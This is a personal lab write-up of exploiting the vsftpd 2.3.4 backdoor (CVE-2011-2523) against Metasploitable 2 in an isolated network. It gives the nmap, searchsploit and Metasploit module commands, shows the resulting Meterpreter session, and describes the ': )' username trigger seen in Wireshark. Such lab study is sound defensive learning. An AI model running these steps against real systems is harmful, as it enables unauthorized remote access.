---
title: Validating the vsftpd 2.3.4 Backdoor in an Isolated Lab
description: >-
  A mini lab that identifies vsftpd 2.3.4 through service enumeration, validates
  the known backdoor, and captures the FTP trigger packet in Wireshark.
published: true
published_at: 2026-04-21T00:00:00.000Z
last_reviewed: 2026-05-22T00:00:00.000Z
cover_image: ./images/meterpreter-sysinfo.png
technologies:
  - kali-linux
  - metasploit-framework
  - mitre-attack
  - nmap
  - wireshark
featured: false
---

# Validating the vsftpd 2.3.4 Backdoor in an Isolated Lab

![hero](/assets/writeups/validating-the-vsftpd-2-3-4-backdoor/images/meterpreter-sysinfo.png)

#### Overview

This mini lab is the first in the Mini Series focused on the exposed FTP service in Metasploitable 2. After enumerating the target, I found vsftpd 2.3.4 running on port 21, tied that version to its known backdoor [CVE-2011-2523](https://www.cve.org/CVERecord?id=CVE-2011-2523), and validated access from Kali Linux while also running a Wireshark packet capture.

#### Lab Architecture

::figure
![Diagram of the isolated VMware lab with Kali Linux and Metasploitable 2](/assets/writeups/validating-the-vsftpd-2-3-4-backdoor/images/PHP-Injection-Diagram-2.png)

Isolated VMware host-only lab showing Kali Linux and Metasploitable 2.
::

| System                    | IP Address     | MAC Address       |
|---------------------------|----------------|-------------------|
| Kali Linux (Attacker)     | 192.168.32.131 | 00:00:00:00:02:1e |
| Metasploitable 2 (Target) | 192.168.32.132 | 00:00:00:00:01:1e |

Both VMs were connected to the same isolated host-only VMware network, allowing direct communication between the attacker and target while keeping all activity off the physical network.

#### Finding the Vulnerability

I started by identifying what was exposed on the target then narrowed in on the FTP service once vsftpd 2.3.4 showed up in the results.

::figure
![Nmap service scan identifying vsftpd 2.3.4 on the target](/assets/writeups/validating-the-vsftpd-2-3-4-backdoor/images/vsftpd-nmap-service-scan.png)

Service enumeration identifying vsftpd 2.3.4 on the target’s exposed FTP service.
::

```text
kali> nmap -p- -sV -oN MS2.txt 192.168.32.132
```

Once I had the version, I used Searchsploit to confirm there was a known exploit path tied to it. [CVE-2011-2523](https://www.cve.org/CVERecord?id=CVE-2011-2523) can open a shell on port 6200 when triggered through a crafted FTP login sequence.

::figure
![Searchsploit results linking vsftpd 2.3.4 to a known backdoor](/assets/writeups/validating-the-vsftpd-2-3-4-backdoor/images/vsftpd-searchsploit-results.png)

Searchsploit results linking vsftpd 2.3.4 to a known backdoor and execution path.
::

```text
kali> searchsploit vsftpd 2.3.4
```

#### Validating Access

After confirming the exploit path, I used the Metasploit module for the vsftpd 2.3.4 backdoor and validated access against the target.

::figure
![Meterpreter session confirming remote access after the backdoor opened](/assets/writeups/validating-the-vsftpd-2-3-4-backdoor/images/vsftpd-meterpreter-sysinfo-session.png)

Successful Meterpreter session confirming remote access on the target after backdoor activation.
::

```text
kali> use exploit/unix/ftp/vsftpd_234_backdoor
kali> set rhosts 192.168.32.132
kali> set lhost 192.168.32.131
kali> exploit
meterpreter> sysinfo
```

#### Packet Evidence

I captured the traffic in Wireshark during exploitation so I could see what actually triggered the backdoor.

::figure
![Wireshark capture of the FTP request that triggers the vsftpd backdoor](/assets/writeups/validating-the-vsftpd-2-3-4-backdoor/images/vsftpd-backdoor-trigger-packet-capture.png)

Wireshark capture of the FTP USER request containing the “: )” trigger used to activate the vsftpd 2.3.4 backdoor.
::

The key packet was the FTP USER request with the smiley trigger in the username. That request is what triggers the backdoor behavior in this version.

::figure
![Packet capture of the FTP login sequence and the backdoor connection](/assets/writeups/validating-the-vsftpd-2-3-4-backdoor/images/vsftpd-full-packet-capture.png)

Packet capture showing the FTP login sequence followed by the backdoor connection.
::

#### Security Impact

Successful exploitation of the vsftpd 2.3.4 backdoor resulted in unauthorized access to the target system. In a real environment, that kind of exposure could give an attacker an initial entry for command execution, follow-on enumeration, and further movement through the environment.

Unlike most vulnerabilities that stem from misconfiguration or unpatched software, this backdoor was the result of supply chain compromise. A malicious actor injected the trigger directly into the vsftpd source repository.

#### MITRE ATT&CK Mapping

| **MITRE ATT&CK Technique** | **ID** | **Relevance to This Lab** |
|----|----|----|
| Exploit Public-Facing Application | T1190 | An exposed FTP service was identified, tied to a known backdoored release, and exploited to validate unauthorized access on the target. |
| Supply Chain Compromise | T1195 | The vsftpd 2.3.4 backdoor was introduced through a malicious modification to the project’s source repository. |

#### Key Takeaways

- Finding the version made the exploit path possible by knowing what to search for.
- Validating access proved the FTP service was actually exploitable, not just outdated.
- The packet capture made it easy to see the exact trigger that led to the backdoor session.
